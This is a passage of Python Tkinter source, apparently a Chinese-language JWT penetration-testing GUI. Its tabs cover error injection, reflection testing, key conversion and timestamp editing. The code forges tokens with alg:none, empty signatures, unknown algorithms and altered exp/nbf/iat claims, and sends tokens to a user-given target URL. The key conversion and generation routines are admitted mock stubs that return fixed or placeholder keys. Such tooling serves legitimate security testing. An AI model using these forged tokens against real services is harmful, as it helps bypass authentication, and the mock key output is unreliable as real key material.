        self.exploit_result.pack(fill='both', expand=True, padx=5, pady=5)
    
    def create_settings_tab(self):
        """创建设置选项卡"""
        settings_frame = ttk.Frame(self.notebook)
        self.notebook.add(settings_frame, text="设置")
        
        # 代理设置
        proxy_frame = ttk.LabelFrame(settings_frame, text="代理设置")
        proxy_frame.pack(fill='x', padx=10, pady=10)
        
        # HTTP代理
        http_proxy_frame = ttk.Frame(proxy_frame)
        http_proxy_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(http_proxy_frame, text="HTTP代理:").pack(side='left')
        self.http_proxy_var = tk.StringVar(value="127.0.0.1:8080")
        ttk.Entry(http_proxy_frame, textvariable=self.http_proxy_var).pack(side='left', fill='x', expand=True, padx=5)
        
        # HTTPS代理
        https_proxy_frame = ttk.Frame(proxy_frame)
        https_proxy_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(https_proxy_frame, text="HTTPS代理:").pack(side='left')
        self.https_proxy_var = tk.StringVar(value="127.0.0.1:8080")
        ttk.Entry(https_proxy_frame, textvariable=self.https_proxy_var).pack(side='left', fill='x', expand=True, padx=5)
        
        # 其他选项
        options_frame = ttk.LabelFrame(settings_frame, text="其他选项")
        options_frame.pack(fill='x', padx=10, pady=10)
        
        # 忽略SSL证书验证
        self.ignore_ssl_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="忽略SSL证书验证", 
                       variable=self.ignore_ssl_var).pack(anchor='w', padx=5, pady=2)
        
        # 不使用代理
        self.no_proxy_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(options_frame, text="不使用代理", 
                       variable=self.no_proxy_var).pack(anchor='w', padx=5, pady=2)
        
        # 跟随重定向
        self.follow_redirect_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="跟随重定向", 
                       variable=self.follow_redirect_var).pack(anchor='w', padx=5, pady=2)
        
        # 保存设置按钮
        ttk.Button(options_frame, text="保存设置", command=self.save_settings).pack(pady=10)
    
    def create_error_injection_tab(self):
        """创建错误注入测试选项卡"""
        error_frame = ttk.Frame(self.notebook)
        self.notebook.add(error_frame, text="错误注入测试")
        
        # JWT输入区域
        input_frame = ttk.LabelFrame(error_frame, text="JWT令牌")
        input_frame.pack(fill='x', padx=10, pady=10)
        
        self.error_jwt_input = scrolledtext.ScrolledText(input_frame, height=5)
        self.error_jwt_input.pack(fill='x', padx=5, pady=5)
        
        # 错误注入类型选择
        injection_frame = ttk.LabelFrame(error_frame, text="错误注入类型")
        injection_frame.pack(fill='x', padx=10, pady=10)
        
        self.injection_types = {}
        injection_types = [
            ("alg:none算法", "none"),
            ("空签名", "nullsig"),
            ("过期时间修改", "exp"),
            ("生效时间修改", "nbf"),
            ("未知算法", "unknown")
        ]
        
        for text, value in injection_types:
            var = tk.BooleanVar()
            self.injection_types[value] = var
            ttk.Checkbutton(injection_frame, text=text, variable=var).pack(anchor='w', padx=5, pady=2)
        
        # 全选/取消全选按钮
        button_frame = ttk.Frame(injection_frame)
        button_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Button(button_frame, text="全选", command=self.select_all_injections).pack(side='left', padx=5)
        ttk.Button(button_frame, text="取消全选", command=self.deselect_all_injections).pack(side='left', padx=5)
        
        # 执行注入按钮
        ttk.Button(injection_frame, text="执行错误注入", command=self.execute_error_injection).pack(pady=5)
        
        # 注入结果显示
        result_frame = ttk.LabelFrame(error_frame, text="注入结果")
        result_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.injection_result = scrolledtext.ScrolledText(result_frame, height=10)
        self.injection_result.pack(fill='both', expand=True, padx=5, pady=5)
        
        # 反射声明测试区域
        reflect_frame = ttk.LabelFrame(error_frame, text="反射声明测试")
        reflect_frame.pack(fill='x', padx=10, pady=10)
        
        # 目标URL输入
        url_frame = ttk.Frame(reflect_frame)
        url_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(url_frame, text="目标URL:").pack(side='left')
        self.reflect_url_var = tk.StringVar()
        ttk.Entry(url_frame, textvariable=self.reflect_url_var).pack(side='left', fill='x', expand=True, padx=5)
        
        # 执行反射测试按钮
        ttk.Button(reflect_frame, text="执行反射声明测试", command=self.execute_reflection_test).pack(pady=5)
        
        # 反射测试结果
        reflect_result_frame = ttk.LabelFrame(error_frame, text="反射测试结果")
        reflect_result_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.reflection_result = scrolledtext.ScrolledText(reflect_result_frame, height=10)
        self.reflection_result.pack(fill='both', expand=True, padx=5, pady=5)
    
    def create_key_conversion_tab(self):
        """创建密钥格式转换选项卡"""
        key_frame = ttk.Frame(self.notebook)
        self.notebook.add(key_frame, text="密钥格式转换")
        
        # 密钥输入区域
        input_frame = ttk.LabelFrame(key_frame, text="密钥输入")
        input_frame.pack(fill='x', padx=10, pady=10)
        
        # 密钥格式选择
        format_frame = ttk.Frame(input_frame)
        format_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(format_frame, text="输入格式:").pack(side='left')
        self.input_format_var = tk.StringVar(value="pem")
        input_combo = ttk.Combobox(format_frame, textvariable=self.input_format_var, 
                                  values=["pem", "jwk", "hex", "base64", "der"], width=10)
        input_combo.pack(side='left', padx=5)
        
        # 密钥输入框
        self.key_input_text = scrolledtext.ScrolledText(input_frame, height=8)
        self.key_input_text.pack(fill='x', padx=5, pady=5)
        
        # 从文件加载按钮
        ttk.Button(input_frame, text="从文件加载", command=self.load_key_file).pack(pady=5)
        
        # 转换选项
        options_frame = ttk.LabelFrame(key_frame, text="转换选项")
        options_frame.pack(fill='x', padx=10, pady=10)
        
        # 输出格式选择
        output_format_frame = ttk.Frame(options_frame)
        output_format_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(output_format_frame, text="输出格式:").pack(side='left')
        self.output_format_var = tk.StringVar(value="jwk")
        output_combo = ttk.Combobox(output_format_frame, textvariable=self.output_format_var, 
                                   values=["pem", "jwk", "hex", "base64", "der"], width=10)
        output_combo.pack(side='left', padx=5)
        
        # 密钥类型选择
        key_type_frame = ttk.Frame(options_frame)
        key_type_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(key_type_frame, text="密钥类型:").pack(side='left')
        self.key_type_var = tk.StringVar(value="RSA")
        key_type_combo = ttk.Combobox(key_type_frame, textvariable=self.key_type_var, 
                                     values=["RSA", "EC", "oct"], width=10)
        key_type_combo.pack(side='left', padx=5)
        
        # 转换按钮
        ttk.Button(options_frame, text="执行转换", command=self.convert_key_format).pack(pady=5)
        
        # 转换结果显示
        result_frame = ttk.LabelFrame(key_frame, text="转换结果")
        result_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.key_conversion_result = scrolledtext.ScrolledText(result_frame, height=10)
        self.key_conversion_result.pack(fill='both', expand=True, padx=5, pady=5)
        
        # 保存结果按钮
        ttk.Button(result_frame, text="保存结果", command=self.save_key_conversion_result).pack(pady=5)
        
        # 密钥生成区域
        generate_frame = ttk.LabelFrame(key_frame, text="密钥生成")
        generate_frame.pack(fill='x', padx=10, pady=10)
        
        # 密钥参数
        params_frame = ttk.Frame(generate_frame)
        params_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(params_frame, text="密钥长度:").pack(side='left')
        self.key_length_var = tk.StringVar(value="2048")
        length_combo = ttk.Combobox(params_frame, textvariable=self.key_length_var, 
                                  values=["512", "1024", "2048", "4096"], width=10)
        length_combo.pack(side='left', padx=5)
        
        ttk.Label(params_frame, text="密钥格式:").pack(side='left')
        self.generate_format_var = tk.StringVar(value="pem")
        gen_format_combo = ttk.Combobox(params_frame, textvariable=self.generate_format_var, 
                                       values=["pem", "jwk"], width=10)
        gen_format_combo.pack(side='left', padx=5)
        
        # 生成按钮
        ttk.Button(generate_frame, text="生成新密钥", command=self.generate_new_key).pack(pady=5)
    
    def create_timestamp_tab(self):
        """创建高级时间戳操作选项卡"""
        timestamp_frame = ttk.Frame(self.notebook)
        self.notebook.add(timestamp_frame, text="时间戳操作")
        
        # JWT输入区域
        input_frame = ttk.LabelFrame(timestamp_frame, text="JWT令牌")
        input_frame.pack(fill='x', padx=10, pady=10)
        
        self.timestamp_jwt_input = scrolledtext.ScrolledText(input_frame, height=5)
        self.timestamp_jwt_input.pack(fill='x', padx=5, pady=5)
        
        ttk.Button(input_frame, text="解析JWT", command=self.parse_timestamp_jwt).pack(pady=5)
        
        # 当前时间戳信息
        current_frame = ttk.LabelFrame(timestamp_frame, text="当前时间戳信息")
        current_frame.pack(fill='x', padx=10, pady=10)
        
        self.current_time_label = ttk.Label(current_frame, text="")
        self.current_time_label.pack(padx=5, pady=5)
        
        # 更新当前时间按钮
        ttk.Button(current_frame, text="更新当前时间", command=self.update_current_time).pack(pady=5)
        
        # 时间戳操作区域
        operation_frame = ttk.LabelFrame(timestamp_frame, text="时间戳操作")
        operation_frame.pack(fill='x', padx=10, pady=10)
        
        # 操作类型选择
        self.timestamp_operation_var = tk.StringVar(value="exp")
        ttk.Radiobutton(operation_frame, text="修改过期时间(exp)", variable=self.timestamp_operation_var, 
                       value="exp").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(operation_frame, text="修改生效时间(nbf)", variable=self.timestamp_operation_var, 
                       value="nbf").pack(anchor='w', padx=5, pady=2)
        ttk.Radiobutton(operation_frame, text="修改签发时间(iat)", variable=self.timestamp_operation_var, 
                       value="iat").pack(anchor='w', padx=5, pady=2)
        
        # 时间设置
        time_frame = ttk.Frame(operation_frame)
        time_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(time_frame, text="时间设置:").pack(side='left')
        self.time_setting_var = tk.StringVar(value="+1h")
        time_combo = ttk.Combobox(time_frame, textvariable=self.time_setting_var, 
                                 values=["-1d", "-12h", "-1h", "-30m", "+30m", "+1h", "+12h", "+1d", "custom"], width=10)
        time_combo.pack(side='left', padx=5)
        
        # 自定义时间输入
        ttk.Label(time_frame, text="自定义时间戳:").pack(side='left')
        self.custom_timestamp_var = tk.StringVar()
        ttk.Entry(time_frame, textvariable=self.custom_timestamp_var).pack(side='left', fill='x', expand=True, padx=5)
        
        # 执行操作按钮
        ttk.Button(operation_frame, text="执行时间戳操作", command=self.execute_timestamp_operation).pack(pady=5)
        
        # 操作结果显示
        result_frame = ttk.LabelFrame(timestamp_frame, text="操作结果")
        result_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.timestamp_result = scrolledtext.ScrolledText(result_frame, height=10)
        self.timestamp_result.pack(fill='both', expand=True, padx=5, pady=5)
        
        # 批量时间戳操作
        batch_frame = ttk.LabelFrame(timestamp_frame, text="批量时间戳操作")
        batch_frame.pack(fill='x', padx=10, pady=10)
        
        # 批量操作设置
        batch_settings_frame = ttk.Frame(batch_frame)
        batch_settings_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(batch_settings_frame, text="起始偏移:").pack(side='left')
        self.batch_start_var = tk.StringVar(value="-1h")
        ttk.Entry(batch_settings_frame, textvariable=self.batch_start_var, width=10).pack(side='left', padx=5)
        
        ttk.Label(batch_settings_frame, text="结束偏移:").pack(side='left')
        self.batch_end_var = tk.StringVar(value="+1h")
        ttk.Entry(batch_settings_frame, textvariable=self.batch_end_var, width=10).pack(side='left', padx=5)
        
        ttk.Label(batch_settings_frame, text="步长:").pack(side='left')
        self.batch_step_var = tk.StringVar(value="15m")
        ttk.Entry(batch_settings_frame, textvariable=self.batch_step_var, width=10).pack(side='left', padx=5)
        
        # 执行批量操作按钮
        ttk.Button(batch_frame, text="执行批量操作", command=self.execute_batch_timestamp_operation).pack(pady=5)
    
    def create_logging_tab(self):
        """创建日志记录系统选项卡"""
        logging_frame = ttk.Frame(self.notebook)
        self.notebook.add(logging_frame, text="日志记录")
        
        # 日志配置区域
        config_frame = ttk.LabelFrame(logging_frame, text="日志配置")
        config_frame.pack(fill='x', padx=10, pady=10)
        
        # 日志级别选择
        level_frame = ttk.Frame(config_frame)
        level_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(level_frame, text="日志级别:").pack(side='left')
        self.log_level_var = tk.StringVar(value="INFO")
        level_combo = ttk.Combobox(level_frame, textvariable=self.log_level_var, 
                                  values=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"], width=10)
        level_combo.pack(side='left', padx=5)
        
        # 日志格式选择
        format_frame = ttk.Frame(config_frame)
        format_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(format_frame, text="日志格式:").pack(side='left')
        self.log_format_var = tk.StringVar(value="standard")
        format_combo = ttk.Combobox(format_frame, textvariable=self.log_format_var, 
                                   values=["standard", "detailed", "json"], width=10)
        format_combo.pack(side='left', padx=5)
        
        # 日志选项
        self.log_to_file_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(config_frame, text="记录到文件", 
                       variable=self.log_to_file_var).pack(anchor='w', padx=5, pady=2)
        
        self.log_to_console_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(config_frame, text="显示在控制台", 
                       variable=self.log_to_console_var).pack(anchor='w', padx=5, pady=2)
        
        self.log_requests_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(config_frame, text="记录HTTP请求", 
                       variable=self.log_requests_var).pack(anchor='w', padx=5, pady=2)
        
        self.log_operations_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(config_frame, text="记录JWT操作", 
                       variable=self.log_operations_var).pack(anchor='w', padx=5, pady=2)
        
        # 应用配置按钮
        ttk.Button(config_frame, text="应用日志配置", command=self.apply_logging_config).pack(pady=5)
        
        # 日志查看区域
        view_frame = ttk.LabelFrame(logging_frame, text="日志查看")
        view_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # 日志过滤
        filter_frame = ttk.Frame(view_frame)
        filter_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(filter_frame, text="过滤级别:").pack(side='left')
        self.log_filter_var = tk.StringVar(value="ALL")
        filter_combo = ttk.Combobox(filter_frame, textvariable=self.log_filter_var, 
                                   values=["ALL", "DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"], width=10)
        filter_combo.pack(side='left', padx=5)
        
        ttk.Button(filter_frame, text="刷新日志", command=self.refresh_logs).pack(side='left', padx=5)
        ttk.Button(filter_frame, text="清除日志", command=self.clear_logs).pack(side='left', padx=5)
        ttk.Button(filter_frame, text="导出日志", command=self.export_logs).pack(side='left', padx=5)
        
        # 日志显示
        self.log_display = scrolledtext.ScrolledText(view_frame, height=15)
        self.log_display.pack(fill='both', expand=True, padx=5, pady=5)
        
        # 日志统计
        stats_frame = ttk.LabelFrame(logging_frame, text="日志统计")
        stats_frame.pack(fill='x', padx=10, pady=10)
        
        self.log_stats_label = ttk.Label(stats_frame, text="暂无统计数据")
        self.log_stats_label.pack(padx=5, pady=5)
        
        ttk.Button(stats_frame, text="更新统计", command=self.update_log_stats).pack(pady=5)
    
    # 错误注入测试相关方法
    def select_all_injections(self):
        """全选所有错误注入类型"""
        for var in self.injection_types.values():
            var.set(True)
    
    def deselect_all_injections(self):
        """取消全选所有错误注入类型"""
        for var in self.injection_types.values():
            var.set(False)
    
    def execute_error_injection(self):
        """执行错误注入测试"""
        jwt_token = self.error_jwt_input.get(1.0, tk.END).strip()
        if not jwt_token:
            messagebox.showerror("错误", "请输入JWT令牌")
            return
        
        selected_injections = [key for key, var in self.injection_types.items() if var.get()]
        if not selected_injections:
            messagebox.showerror("错误", "请至少选择一种错误注入类型")
            return
        
        self.injection_result.delete(1.0, tk.END)
        self.injection_result.insert(tk.END, "正在执行错误注入测试...\n\n")
        
        try:
            # 解析原始JWT
            parts = jwt_token.split('.')
            if len(parts) != 3:
                self.injection_result.insert(tk.END, "无效的JWT格式\n")
                return
            
            header = json.loads(base64url_decode(parts[0]))
            payload = json.loads(base64url_decode(parts[1]))
            signature = parts[2]
            
            self.injection_result.insert(tk.END, f"原始JWT解析结果:\n")
            self.injection_result.insert(tk.END, f"Header: {json.dumps(header, indent=2)}\n")
            self.injection_result.insert(tk.END, f"Payload: {json.dumps(payload, indent=2)}\n\n")
            
            # 执行各种错误注入
            for injection_type in selected_injections:
                self.injection_result.insert(tk.END, f"执行 {injection_type} 错误注入:\n")
                
                if injection_type == "none":
                    # alg:none算法注入
                    new_header = header.copy()
                    new_header["alg"] = "none"
                    new_payload = payload.copy()
                    new_jwt = f"{base64url_encode(json.dumps(new_header))}.{base64url_encode(json.dumps(new_payload))}."
                    self.injection_result.insert(tk.END, f"  生成JWT: {new_jwt}\n")
                
                elif injection_type == "nullsig":
                    # 空签名注入
                    new_header = header.copy()
                    new_payload = payload.copy()
                    new_jwt = f"{base64url_encode(json.dumps(new_header))}.{base64url_encode(json.dumps(new_payload))}."
                    self.injection_result.insert(tk.END, f"  生成JWT: {new_jwt}\n")
                
                elif injection_type == "exp":
                    # 过期时间修改
                    new_payload = payload.copy()
                    # 设置为已过期的时间戳（1小时前）
                    new_payload["exp"] = int(time.time()) - 3600
                    new_jwt = f"{base64url_encode(json.dumps(header))}.{base64url_encode(json.dumps(new_payload))}.{signature}"
                    self.injection_result.insert(tk.END, f"  生成JWT: {new_jwt}\n")
                
                elif injection_type == "nbf":
                    # 生效时间修改
                    new_payload = payload.copy()
                    # 设置为未来的生效时间（1小时后）
                    new_payload["nbf"] = int(time.time()) + 3600
                    new_jwt = f"{base64url_encode(json.dumps(header))}.{base64url_encode(json.dumps(new_payload))}.{signature}"
                    self.injection_result.insert(tk.END, f"  生成JWT: {new_jwt}\n")
                
                elif injection_type == "unknown":
                    # 未知算法注入
                    new_header = header.copy()
                    new_header["alg"] = "unknown"
                    new_payload = payload.copy()
                    new_jwt = f"{base64url_encode(json.dumps(new_header))}.{base64url_encode(json.dumps(new_payload))}.{signature}"
                    self.injection_result.insert(tk.END, f"  生成JWT: {new_jwt}\n")
                
                self.injection_result.insert(tk.END, "\n")
            
            self.injection_result.insert(tk.END, "错误注入测试完成\n")
            
        except Exception as e:
            self.injection_result.insert(tk.END, f"错误: {str(e)}\n")
    
    def execute_reflection_test(self):
        """执行反射声明测试"""
        jwt_token = self.error_jwt_input.get(1.0, tk.END).strip()
        target_url = self.reflect_url_var.get()
        
        if not jwt_token:
            messagebox.showerror("错误", "请输入JWT令牌")
            return
        
        if not target_url:
            messagebox.showerror("错误", "请输入目标URL")
            return
        
        self.reflection_result.delete(1.0, tk.END)
        self.reflection_result.insert(tk.END, "正在执行反射声明测试...\n\n")
        
        try:
            # 解析JWT
            parts = jwt_token.split('.')
            if len(parts) != 3:
                self.reflection_result.insert(tk.END, "无效的JWT格式\n")
                return
            
            header = json.loads(base64url_decode(parts[0]))
            payload = json.loads(base64url_decode(parts[1]))
            
            # 为每个声明创建测试令牌
            test_tokens = []
            unique_id = str(int(time.time()))
            
            # 测试Header中的声明
            for claim, value in header.items():
                test_header = header.copy()
                test_header[claim] = f"{value}_{unique_id}"
                test_payload = payload.copy()
                test_jwt = f"{base64url_encode(json.dumps(test_header))}.{base64url_encode(json.dumps(test_payload))}.{parts[2]}"
                test_tokens.append((f"Header.{claim}", test_jwt))
            
            # 测试Payload中的声明
            for claim, value in payload.items():
                test_payload = payload.copy()
                test_payload[claim] = f"{value}_{unique_id}"
                test_jwt = f"{base64url_encode(json.dumps(header))}.{base64url_encode(json.dumps(test_payload))}.{parts[2]}"
                test_tokens.append((f"Payload.{claim}", test_jwt))
            
            self.reflection_result.insert(tk.END, f"生成了 {len(test_tokens)} 个测试令牌\n\n")
            
            # 发送测试请求
            for claim_name, test_jwt in test_tokens:
                self.reflection_result.insert(tk.END, f"测试声明 {claim_name}:\n")
                
                try:
                    headers = {"Authorization": f"Bearer {test_jwt}"}
                    response = requests.get(target_url, headers=headers, timeout=10)
                    
                    # 检查响应中是否包含唯一标识符
                    if unique_id in response.text:
                        self.reflection_result.insert(tk.END, f"  [发现反射] 声明 {claim_name} 在响应中反射\n")
                    else:
                        self.reflection_result.insert(tk.END, f"  [未反射] 声明 {claim_name} 未在响应中反射\n")
                    
                    self.reflection_result.insert(tk.END, f"  状态码: {response.status_code}\n")
                    
                except Exception as e:
                    self.reflection_result.insert(tk.END, f"  请求失败: {str(e)}\n")
                
                self.reflection_result.insert(tk.END, "\n")
            
            self.reflection_result.insert(tk.END, "反射声明测试完成\n")
            
        except Exception as e:
            self.reflection_result.insert(tk.END, f"错误: {str(e)}\n")
    
    # 密钥格式转换相关方法
    def load_key_file(self):
        """从文件加载密钥"""
        file_path = filedialog.askopenfilename(
            title="选择密钥文件",
            filetypes=[("所有文件", "*.*"), ("PEM文件", "*.pem"), ("JWK文件", "*.jwk"), ("文本文件", "*.txt")]
        )
        
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    content = f.read()
                self.key_input_text.delete(1.0, tk.END)
                self.key_input_text.insert(1.0, content)
                
                # 根据文件扩展名自动设置输入格式
                if file_path.endswith('.pem'):
                    self.input_format_var.set("pem")
                elif file_path.endswith('.jwk'):
                    self.input_format_var.set("jwk")
                
                messagebox.showinfo("成功", "密钥文件加载成功")
            except Exception as e:
                messagebox.showerror("错误", f"加载密钥文件失败: {str(e)}")
    
    def convert_key_format(self):
        """转换密钥格式"""
        key_data = self.key_input_text.get(1.0, tk.END).strip()
        input_format = self.input_format_var.get()
        output_format = self.output_format_var.get()
        key_type = self.key_type_var.get()
        
        if not key_data:
            messagebox.showerror("错误", "请输入密钥数据")
            return
        
        self.key_conversion_result.delete(1.0, tk.END)
        self.key_conversion_result.insert(tk.END, "正在转换密钥格式...\n\n")
        
        try:
            # 这里应该实现实际的密钥格式转换逻辑
            # 由于涉及复杂的密码学操作，这里只提供一个模拟实现
            
            self.key_conversion_result.insert(tk.END, f"输入格式: {input_format}\n")
            self.key_conversion_result.insert(tk.END, f"输出格式: {output_format}\n")
            self.key_conversion_result.insert(tk.END, f"密钥类型: {key_type}\n\n")
            
            # 模拟转换结果
            if input_format == "pem" and output_format == "jwk":
                # 模拟PEM到JWK的转换
                jwk_key = {
                    "kty": key_type,
                    "use": "sig",
                    "alg": "RS256" if key_type == "RSA" else "ES256",
                    "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw",
                    "e": "AQAB",
                    "kid": "2011-04-29"
                }
                result = json.dumps(jwk_key, indent=2)
            
            elif input_format == "jwk" and output_format == "pem":
                # 模拟JWK到PEM的转换
                result = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0vx7agoebGcQSuuPiLJ
XZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6
tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93
lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9
c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6W
eZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJ
zKnqDKgwIDAQAB
-----END PUBLIC KEY-----"""
            
            else:
                # 其他格式的模拟转换
                result = f"模拟转换结果:\n原始数据: {key_data[:50]}...\n转换后的{output_format}格式数据"
            
            self.key_conversion_result.insert(tk.END, "转换结果:\n")
            self.key_conversion_result.insert(tk.END, result)
            
        except Exception as e:
            self.key_conversion_result.insert(tk.END, f"转换失败: {str(e)}\n")
    
    def save_key_conversion_result(self):
        """保存密钥转换结果"""
        result = self.key_conversion_result.get(1.0, tk.END).strip()
        if not result:
            messagebox.showerror("错误", "没有可保存的结果")
            return
        
        file_path = filedialog.asksaveasfilename(
            title="保存转换结果",
            defaultextension=".txt",
            filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")]
        )
        
        if file_path:
            try:
                with open(file_path, 'w') as f:
                    f.write(result)
                messagebox.showinfo("成功", "转换结果已保存")
            except Exception as e:
                messagebox.showerror("错误", f"保存失败: {str(e)}")
    
    def generate_new_key(self):
        """生成新密钥"""
        key_length = self.key_length_var.get()
        generate_format = self.generate_format_var.get()
        
        try:
            # 这里应该实现实际的密钥生成逻辑
            # 由于涉及复杂的密码学操作，这里只提供一个模拟实现
            
            self.key_conversion_result.delete(1.0, tk.END)
            self.key_conversion_result.insert(tk.END, "正在生成新密钥...\n\n")
            self.key_conversion_result.insert(tk.END, f"密钥长度: {key_length}\n")
            self.key_conversion_result.insert(tk.END, f"密钥格式: {generate_format}\n\n")
            
            # 模拟密钥生成
            if generate_format == "pem":
                # 模拟PEM格式密钥
                private_key = f"""-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA{key_length}模拟生成的RSA私钥数据{key_length}
-----END RSA PRIVATE KEY-----"""
                
                public_key = f"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA{key_length}模拟生成的RSA公钥数据{key_length}
-----END PUBLIC KEY-----"""
                
                result = f"私钥:\n{private_key}\n\n公钥:\n{public_key}"
            
            elif generate_format == "jwk":
                # 模拟JWK格式密钥
                jwk_key = {
                    "kty": "RSA",
                    "size": key_length,
                    "use": "sig",
                    "alg": "RS256",
                    "n": f"模拟生成的RSA模数_{key_length}位",
                    "e": "AQAB",
                    "d": f"模拟生成的RSA私钥指数_{key_length}位",
                    "p": f"模拟生成的RSA素数p_{key_length}位",
                    "q": f"模拟生成的RSA素数q_{key_length}位",
                    "kid": f"generated_{int(time.time())}"
                }
                result = json.dumps(jwk_key, indent=2)
            
            else:
                result = f"模拟生成的{generate_format}格式密钥，长度{key_length}位"
            
            self.key_conversion_result.insert(tk.END, "密钥生成结果:\n")
            self.key_conversion_result.insert(tk.END, result)
            
        except Exception as e:
            self.key_conversion_result.insert(tk.END, f"密钥生成失败: {str(e)}\n")
    
    # 时间戳操作相关方法
    def parse_timestamp_jwt(self):
        """解析时间戳操作选项卡中的JWT"""
        jwt_token = self.timestamp_jwt_input.get(1.0, tk.END).strip()
        if not jwt_token:
            messagebox.showerror("错误", "请输入JWT令牌")
            return
        
        try:
            parts = jwt_token.split('.')
            if len(parts) != 3:
                messagebox.showerror("错误", "无效的JWT格式")
                return
            
            header = json.loads(base64url_decode(parts[0]))
            payload = json.loads(base64url_decode(parts[1]))
            
            # 显示时间戳相关信息
            self.timestamp_result.delete(1.0, tk.END)
            self.timestamp_result.insert(tk.END, "JWT解析结果:\n\n")
            self.timestamp_result.insert(tk.END, f"Header: {json.dumps(header, indent=2)}\n\n")
            self.timestamp_result.insert(tk.END, f"Payload: {json.dumps(payload, indent=2)}\n\n")
            
            # 显示时间戳相关信息
            timestamp_claims = ["exp", "nbf", "iat"]
            self.timestamp_result.insert(tk.END, "时间戳声明:\n")
            
            for claim in timestamp_claims:
                if claim in payload:
                    timestamp = payload[claim]
                    if isinstance(timestamp, (int, float)):
                        dt = datetime.datetime.fromtimestamp(timestamp)
                        self.timestamp_result.insert(tk.END, f"  {claim}: {timestamp} ({dt.strftime('%Y-%m-%d %H:%M:%S')})\n")
                    else:
                        self.timestamp_result.insert(tk.END, f"  {claim}: {timestamp} (非时间戳格式)\n")
                else:
                    self.timestamp_result.insert(tk.END, f"  {claim}: 不存在\n")
            
            # 更新当前时间
            self.update_current_time()
            
        except Exception as e:
            messagebox.showerror("错误", f"解析JWT失败: {str(e)}")
    
    def update_current_time(self):
        """更新当前时间戳信息"""
        now = int(time.time())
        dt = datetime.datetime.fromtimestamp(now)
        self.current_time_label.config(text=f"当前时间戳: {now} ({dt.strftime('%Y-%m-%d %H:%M:%S')})")
    
    def execute_timestamp_operation(self):
        """执行时间戳操作"""
        jwt_token = self.timestamp_jwt_input.get(1.0, tk.END).strip()
        if not jwt_token:
            messagebox.showerror("错误", "请输入JWT令牌")
            return
        
        operation = self.timestamp_operation_var.get()
        time_setting = self.time_setting_var.get()
        custom_timestamp = self.custom_timestamp_var.get()
        
        try:
            parts = jwt_token.split('.')
            if len(parts) != 3:
                messagebox.showerror("错误", "无效的JWT格式")
                return
            
            header = json.loads(base64url_decode(parts[0]))
            payload = json.loads(base64url_decode(parts[1]))
            signature = parts[2]
            
            # 计算新的时间戳
            if time_setting == "custom":
                if not custom_timestamp:
                    messagebox.showerror("错误", "请输入自定义时间戳")
                    return
                try:
                    new_timestamp = int(custom_timestamp)
                except ValueError:
                    messagebox.showerror("错误", "自定义时间戳必须是整数")
                    return
            else:
                # 解析时间设置
                if time_setting.startswith("+"):
                    offset = time_setting[1:]
                    future = True
                else:
                    offset = time_setting[1:]
                    future = False
                
                if offset.endswith("d"):
                    seconds = int(offset[:-1]) * 86400
                elif offset.endswith("h"):
                    seconds = int(offset[:-1]) * 3600
                elif offset.endswith("m"):
                    seconds = int(offset[:-1]) * 60
                else:
                    seconds = int(offset)
                
                if future:
                    new_timestamp = int(time.time()) + seconds
                else:
                    new_timestamp = int(time.time()) - seconds
            
            # 更新payload中的时间戳
            new_payload = payload.copy()
            new_payload[operation] = new_timestamp
            
            # 生成新的JWT
            new_jwt = f"{base64url_encode(json.dumps(header))}.{base64url_encode(json.dumps(new_payload))}.{signature}"
            
            # 显示结果
            self.timestamp_result.delete(1.0, tk.END)
